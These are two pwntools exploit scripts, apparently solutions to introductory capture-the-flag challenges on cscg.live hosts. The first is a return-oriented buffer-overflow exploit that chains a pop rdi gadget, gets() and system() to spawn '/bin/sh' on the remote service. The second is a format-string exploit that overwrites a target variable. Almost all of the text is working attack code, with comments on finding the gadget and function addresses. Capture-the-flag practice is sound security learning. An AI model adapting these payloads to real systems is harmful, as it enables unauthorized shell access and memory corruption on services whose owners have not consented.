Buffer overflow script 1

from pwn import *
#connections
#io = process("./intro-pwn")
io = process(["ncat", "--ssl-verify", "8eabc9018ee7a886c929aaf1-1024-intro-pwn-1.challenge.cscg.live", "1337"])

#add ncat process here after testing

#addresses found with gdb
pop_rdi         = 0x401205      #ROPgadget --binary ./intro-pwn | grep "pop rdi"
system_addr     = 0x401040      #objdump -d ./intro-pwn | grep system
data_addr       = 0x404028      #readelf -S ./intro-pwn | grep .data
gets_addr       = 0x401060      #objdump -d ./intro-pwn | grep gets@plt

#payload
payload = b"A" * 24 #offset

#write "/bin/sh" to .data section
payload += p64(pop_rdi)         #sets rdi to the address of .data
payload += p64(data_addr)
payload += p64(gets_addr)       #use gets() to write "/bin/sh" to .data

#call system("/bin/sh")

payload += p64(pop_rdi)      # Set RDI to the address of "/bin/sh"
payload += p64(data_addr)
payload += p64(system_addr)  # Call system()

io.sendline(payload)
io.sendline(b"/bin/sh")      # Provide "/bin/sh" as input
io.interactive()


################################################################################################


Format String script 1

from pwn import *

context.arch =  "amd64"         #found in file enumeration

bug_addr =      0x40406c        # nm ./intro-fmt | grep bug

def send_payload(payload):
        r = process(["ncat", "--ssl-verify",  "656c9c6df8d1a3d13267d8f1-1024-intro-pwn-2.challenge.cscg.live", "1337"])
        log.info(f"Payload: {repr(payload)}")
        r.sendlineafter(b"What is your name?\n", payload)
        output = r.recvall()
        log.info(f"Output: {output.decode()}")
        r.close()
        return output

#create format string object
format_string = FmtStr(execute_fmt=send_payload)

#use the object to write value 1 to bug
format_string.write(bug_addr, 1)

#execute the writes
format_string.execute_writes()
